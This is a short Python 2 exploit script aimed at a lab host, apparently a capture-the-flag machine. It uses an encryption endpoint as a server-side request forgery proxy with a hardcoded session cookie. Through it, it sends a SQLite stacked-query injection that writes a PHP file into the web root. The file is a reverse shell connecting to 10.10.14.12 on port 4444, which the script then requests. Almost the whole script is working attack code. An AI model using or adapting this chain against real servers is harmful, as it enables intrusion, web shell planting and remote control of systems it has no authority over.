import urllib
import requests as s
import sys
from bs4 import BeautifulSoup
import base64

URL = "http://10.10.10.129/encrypt.php"
TEMP_FILE = "rc4_encrypted_temp.txt"

def get_cipher(cipher='RC4', url='http://127.0.0.1/dev/index.php?view=about'):
    payload = {'cipher': cipher, 'url': url}
    cookie = {'PHPSESSID': 'h1858q2bfo87l4gl9ie7qic7hv'}
    resp = s.get(url=URL, params=payload, allow_redirects=False, cookies=cookie)
    if resp.status_code != 200:
        print "Must log in"
        sys.exit()
    soup = BeautifulSoup(resp.text, 'html.parser')
    tx = soup.find('textarea')
    if len(tx.contents) == 0:
        return False
    return tx.contents[0]


def write_cipher_to_file(b64=""):
    ciphertext = base64.b64decode(b64)
    f = open(TEMP_FILE, "w")
    f.write(ciphertext)
    f.close()


def decode_cipher(c=""):
    return base64.b64decode(c)


def process(url):
    c = get_cipher(url=url)
    if not c:
        return False
    write_cipher_to_file(c)
    c = get_cipher(url='http://10.10.14.12/dev.cipher')
    if c:
        print decode_cipher(c)
        #print url
        return True

args = "bookid=1; ATTACH DATABASE '/var/www/html/dev/d9e28afcf0b274a5e0542abb67db0784/test.php' AS test; CREATE TABLE test.pwn (dataz text); INSERT INTO test.pwn (dataz) VALUES ('<?php $sock = fsockopen(\"10.10.14.12\",4444);$proc = proc_open(\"/bin/bash -i\", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>')"

args = args.replace(" ", "%20")
print urllib.quote(args, safe="%/:=&?~#+!$,;'@()*[]")

url = "http://127.0.0.1/dev/sqlite_test_page.php?no_results=true&{}".format(args)
process(url)

url = "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/test.php?cmd=ls"
process(url)
